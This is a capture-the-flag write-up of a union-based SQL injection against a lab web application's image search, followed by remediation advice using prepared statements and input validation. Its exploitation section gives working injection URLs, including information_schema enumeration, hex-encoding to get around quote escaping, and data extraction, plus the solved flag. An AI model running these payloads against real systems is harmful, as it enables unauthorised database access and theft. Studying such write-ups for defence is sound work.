# SQL Injection - Image Search Vulnerability

## How I Found It

### 1. Initial Discovery
- Navigated to the image search page at `http://192.168.1.16/index.php?page=searchimg`
- Noticed a search form with an `id` parameter that searches images by ID
- The URL structure was: `http://192.168.1.16/index.php?page=searchimg&id=X`

### 2. Testing for SQL Injection
- First, I tested with a normal value: `?page=searchimg&id=1` → returned one image (Nsa)
- Then tested with `?page=searchimg&id=0=0` → returned 5 results, confirming the input was being directly inserted into the SQL query without sanitization
- This behavior indicated a SQL injection vulnerability similar to the member search page

### 3. Determining Column Count
Used `ORDER BY` clause to find the number of columns in the SELECT statement:
- `?page=searchimg&id=1 ORDER BY 1` → Success (returned result)
- `?page=searchimg&id=1 ORDER BY 2` → Success (returned result)
- `?page=searchimg&id=1 ORDER BY 3` → Error (no results returned)

**Conclusion:** The query returns **2 columns**

---

## How I Exploited It

### Step 1: Enumerate Database Tables

**Query used:**
```
http://192.168.1.16/index.php?page=searchimg&id=1 UNION SELECT null,table_name FROM information_schema.tables
```

**Result:** Found multiple tables, including:
- `users` (already exploited in the member page)
- `guestbook` (related to feedback/XSS)
- **`list_images`** (target table for this vulnerability)
- `vote_dbs` (survey data)

### Step 2: Enumerate Columns in the list_images Table

**Query used:**
```
http://192.168.1.16/index.php?page=searchimg&id=1 UNION SELECT null,column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573
```

**Note:** I used hex encoding `0x6c6973745f696d61676573` (which is "list_images" in hex) because single quotes might be escaped.

**Result:** Found these columns:
- `id`
- `url`
- `title`
- `comment` (hidden column - not displayed in normal queries)

### Step 3: Extract All Data from the comment Column

**Query used:**
```
http://192.168.1.16/index.php?page=searchimg&id=1 UNION SELECT title,comment FROM list_images
```

**Result:** Retrieved all images with their titles and comments:
- Image "Nsa" - Comment: "An image about the NSA !"
- Image "42 !" - Comment: "There is a number.."
- Image "Google" - Comment: "Google it !"
- Image "Earth" - Comment: "Earth!"
- Image "Hack me ?" - Comment: **"If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46"**

### Step 4: Follow the Instructions

Based on the comment hint:
1. **MD5 Hash:** `1928e8083cf461a51303633093573c46`
2. **Decrypt MD5:** Used https://md5decrypt.net/ → Result: `albatroz`
3. **Convert to lowercase:** `albatroz` (already lowercase)
4. **Apply SHA256 hash:**
```bash
echo -n "albatroz" | sha256sum
```

**Final flag:** `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

---

## Why It Works (Vulnerability Explanation)

### The Vulnerability: SQL Injection

SQL Injection occurs when user input is directly concatenated into SQL queries without proper sanitization or parameterization.

### In this case:

The vulnerable code likely looks like this:
```php
$id = $_GET['id'];
$query = "SELECT title, url FROM list_images WHERE id = " . $id;
$result = mysqli_query($connection, $query);
```

When I input `1 UNION SELECT title,comment FROM list_images`, the actual query becomes:
```sql
SELECT title, url FROM list_images 
WHERE id = 1 
UNION SELECT title, comment FROM list_images
```

### Why UNION works:
- The `UNION` operator combines results from multiple SELECT statements
- Both SELECT statements must have the same number of columns (2 in this case)
- This allows me to query ANY column from ANY table in the database, not just the intended `title` and `url` columns
- The `comment` column was hidden from normal users but accessible via SQL injection

### Why hex encoding (0x6c6973745f696d61676573) was used:
- The application might be escaping single quotes (`'list_images'` becomes `\'list_images\'`)
- Hex encoding bypasses this protection because it doesn't use quotes
- `0x6c6973745f696d61676573` is interpreted directly as the string "list_images" by MySQL/MariaDB

### information_schema abuse:
- `information_schema` is a built-in MySQL/MariaDB database that contains metadata about all databases, tables, and columns
- It's readable by default, making it perfect for database enumeration during SQL injection attacks
- Attackers can discover:
  - All table names via `information_schema.tables`
  - All column names via `information_schema.columns`
  - Database structure and sensitive data locations

---

## How to Fix It (Security Recommendations)

### 1. Use Prepared Statements (Parameterized Queries) - CRITICAL

**Instead of:**
```php
$id = $_GET['id'];
$query = "SELECT title, url FROM list_images WHERE id = " . $id;
$result = mysqli_query($connection, $query);
```

**Use:**
```php
$id = $_GET['id'];
$stmt = $connection->prepare("SELECT title, url FROM list_images WHERE id = ?");
$stmt->bind_param("i", $id);  // "i" means integer
$stmt->execute();
$result = $stmt->get_result();
```

**Why this works:** The database treats user input as DATA, not as CODE. The SQL structure is defined separately from the user input, preventing injection attacks.

### 2. Input Validation

Validate that the `id` parameter is actually an integer:
```php
$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
if ($id === false || $id < 1) {
    die("Invalid ID");
}
```

**Additional validation:**
- Whitelist allowed characters
- Check data types strictly
- Reject unexpected input formats
- Implement length limits

### 3. Principle of Least Privilege

- The database user used by the web application should have minimal permissions
- **Restrict access to `information_schema`** tables beyond what's necessary
- Use separate database users with restricted permissions for web applications
- Grant only SELECT permission on specific tables needed
- Never use root or admin database accounts in web applications

### 4. Error Handling

- Don't display raw SQL errors to users
- Errors like "You have an error in your SQL syntax..." reveal database structure
- Log errors server-side for debugging
- Show generic error messages to users: "An error occurred. Please try again."

### 5. Database Security Best Practices

**Remove or protect sensitive data:**
- Don't store sensitive information in comment fields accessible via injection
- Use separate tables with proper access controls for sensitive data
- Encrypt sensitive data at rest
- Hash passwords with strong algorithms (bcrypt, Argon2)

**The MD5 hash issue:**
- The flag was protected with MD5, which is cryptographically broken
- MD5 hashes can be cracked easily using online crackers
- Never use MD5 for password hashing or security-sensitive operations

---

## Additional Notes

### OWASP Top 10:
This vulnerability is ranked **#3 in the OWASP Top 10 (2021): A03:2021 – Injection**

### Real-world Impact:
SQL Injection can lead to:
- **Complete database compromise** - Access to all data
- **Data theft** - Customer information, credentials, financial data
- **Data manipulation or deletion** - Modify or destroy records
- **Authentication bypass** - Login as any user without credentials
- **Remote code execution** - In some cases, execute system commands
- **Denial of Service** - Crash the database or application

### Common SQL Injection Types:
1. **Union-based** (used here) - Combines malicious query results
2. **Boolean-based blind** - Infers data from true/false responses
3. **Time-based blind** - Infers data from response delays
4. **Error-based** - Extracts data from error messages
5. **Stacked queries** - Executes multiple queries separated by semicolons

---

## References

- **OWASP SQL Injection:** https://owasp.org/www-community/attacks/SQL_Injection
- **OWASP SQL Injection Prevention Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- **CWE-89:** Improper Neutralization of Special Elements used in an SQL Command
- **OWASP Testing Guide:** Testing for SQL Injection

---

## Conclusion

This SQL Injection vulnerability in the image search functionality allowed complete database enumeration and data extraction. The root cause was the direct concatenation of user input into SQL queries without parameterization or validation.

**Key Takeaways:**
1. Never trust user input
2. Always use prepared statements
3. Implement proper error handling
4. Apply the principle of least privilege
5. Use defense in depth strategy
6. Don't store sensitive data in easily accessible fields
7. Replace weak hashing algorithms (MD5) with modern alternatives

The fix requires a comprehensive approach combining secure coding practices, proper database configuration, input validation, and ongoing security monitoring.